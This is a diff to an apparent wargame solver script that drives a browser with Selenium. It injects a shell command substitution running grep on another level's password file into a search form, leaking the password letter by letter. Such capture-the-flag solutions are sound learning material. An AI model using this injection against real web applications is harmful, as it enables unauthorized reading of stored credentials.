@@ -37,12 +37,13 @@ def solve(driver, last_password):
                 raise RuntimeError(f"Could not find letter {x} of the password, seems to be a number but hex method isn't working.")
             
         else:
+            # it's a letter, we're gonna find if it's capital or lowercase, and then add it to the password
             letter = results[0][0]
             # now we need to find if it's capital or lowercase. empty result means
             base_word = "blubbers"  # if any letter comes after it, it's not in the dictionary, i checked.
             position_string = "{" + str(x) + "}"
             
-            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^{base_word}$(grep ^{position_string}{letter.lower()} {build_webpass_path(17)})')
+            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^.{base_word}$(grep ^{position_string}{letter.lower()} {build_webpass_path(17)})')
             driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
             
             WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
